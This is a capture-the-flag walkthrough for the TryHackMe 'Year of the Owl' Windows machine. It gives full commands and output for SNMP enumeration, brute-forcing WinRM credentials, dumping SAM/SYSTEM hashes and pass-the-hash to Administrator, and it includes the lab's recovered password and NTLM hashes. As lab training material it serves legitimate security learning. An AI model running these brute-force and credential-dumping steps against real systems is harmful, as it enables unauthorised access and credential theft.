# TryHackMe - Year of the Owl Walkthrough

**Difficulty:** Medium  
**OS:** Windows Server 2019  
**Attack Chain:** SNMP Enumeration -> WinRM Brute Force -> SAM/SYSTEM Dump -> Pass the Hash

---

## Table of Contents

1. [Initial Enumeration](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#initial-enumeration)
2. [Full Port Scan](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#full-port-scan)
3. [Web Enumeration](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#web-enumeration)
4. [SNMP Enumeration](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#snmp-enumeration)
5. [WinRM Brute Force](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#winrm-brute-force)
6. [Initial Foothold](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#initial-foothold)
7. [Privilege Escalation](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#privilege-escalation)
8. [Root](https://claude.ai/chat/2c22cefe-a906-4497-a753-5184ac39ac8c#root)

---

## Initial Enumeration

Start with a default nmap scan:

```bash
sudo nmap -sC -sV -T4 --min-rate=1000 <TARGET_IP>
```

This returns only 3 filtered ports (135, 139, 3389). Filtered means a firewall is dropping packets. Do not stop here -- run a full port scan.

---

## Full Port Scan

```bash
sudo nmap -sV -sC -p- -T4 --min-rate=2000 <TARGET_IP>
```

Results:

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
445/tcp   open  microsoft-ds
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Key findings:

- XAMPP stack (Apache + MariaDB + PHP) on Windows
- WinRM running on port 5985 -- primary shell target once we have credentials
- Windows Server 2019 Build 17763

---

## Web Enumeration

Run gobuster while manually browsing the site:

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak \
  -t 40 -o gobuster_80.txt
```

The homepage is a static splash image with no interactive elements. Page source is bare HTML with no comments or hidden fields.

Gobuster finds /phpmyadmin and /webalizer but both return 403. Dead end on the web front.

---

## SNMP Enumeration

UDP scanning shows all ports as open|filtered due to firewall. Use onesixtyone to brute force SNMP community strings directly:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>
```

Output:

```
10.x.x.x [openview] Hardware: Intel64 Family 6 ...
```

Community string found: **openview**

Now extract useful information with snmpwalk:

```bash
# Enumerate local user accounts
snmpwalk -v1 -c openview <TARGET_IP> 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -v1 -c openview <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2

# Enumerate installed software
snmpwalk -v1 -c openview <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
```

User accounts discovered:

```
STRING: "Guest"
STRING: "Jareth"
STRING: "Administrator"
STRING: "DefaultAccount"
STRING: "WDAGUtilityAccount"
```

The non-default, non-admin account is **Jareth** -- this is our target.

---

## WinRM Brute Force

WinRM (port 5985) is open and we have a username. Brute force the password with crackmapexec:

```bash
crackmapexec winrm <TARGET_IP> -u Jareth -p /usr/share/wordlists/rockyou.txt 2>/dev/null | grep -v "\[-\]"
```

Note: Use `grep -v "\[-\]"` to suppress failed attempts and only display the hit.

Result:

```
[+] year-of-the-owl\Jareth:sarah (Pwn3d!)
```

Credentials: **Jareth:sarah**

---

## Initial Foothold

Connect with evil-winrm:

```bash
evil-winrm -i <TARGET_IP> -u Jareth -p sarah
```

Grab the user flag:

```powershell
type C:\Users\Jareth\Desktop\user.txt
```

Check privileges and group membership:

```powershell
whoami /priv
whoami /groups
```

Jareth has no interesting privileges (no SeImpersonatePrivilege, no SeDebugPrivilege). Standard user in the Remote Management Users group.

---

## Privilege Escalation

Enumerate the filesystem. Note that `C:\xampp` is inaccessible to Jareth.

Check the Recycle Bin -- use single quotes to prevent PowerShell expanding the $ as a variable:

```powershell
Get-ChildItem -Path 'C:\$Recycle.Bin' -Force
```

Two SID directories are present. SID ending in 500 is Administrator, SID ending in 1001 is Jareth.

Check Jareth's Recycle Bin:

```powershell
Get-ChildItem -Path 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001' -Force
```

Output:

```
-a----   9/18/2020   7:28 PM   49152    sam.bak
-a----   9/18/2020   7:28 PM   17457152 system.bak
```

SAM database and SYSTEM hive backups left in the Recycle Bin. These contain local account password hashes.

Download both files directly via evil-winrm (no need to copy them elsewhere first):

```powershell
download 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak'
download 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak'
```

On Kali, extract the hashes with impacket-secretsdump:

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

Output:

```
[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
```

Administrator NTLM hash: **6bc99ede9edcfecf9662fb0c0ddcfa7a**

---

## Root

Pass the hash directly to evil-winrm -- no need to crack it:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

Grab the root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
SNMP community string (openview)
        |
        v
Local user enumeration --> Jareth discovered
        |
        v
WinRM brute force (rockyou.txt) --> Jareth:sarah
        |
        v
Evil-WinRM shell as Jareth
        |
        v
SAM/SYSTEM backups in Recycle Bin
        |
        v
impacket-secretsdump --> Administrator NTLM hash
        |
        v
Pass-the-hash via Evil-WinRM --> Administrator shell
```

---

## Key Takeaways

- Always run a full `-p-` port scan. The default scan showed almost nothing on this box.
- SNMP is a high-value target on Windows machines. Community strings like `public`, `private`, and `openview` are common defaults.
- The Recycle Bin is a legitimate privesc hunting ground and is frequently overlooked.
- SAM/SYSTEM backups anywhere on the filesystem are critical findings -- they expose all local account hashes.
- Pass-the-hash with evil-winrm `-H` bypasses the need to crack NTLM hashes entirely.
- Evil-WinRM can download files from any readable path directly -- no need to stage files in a writable directory first.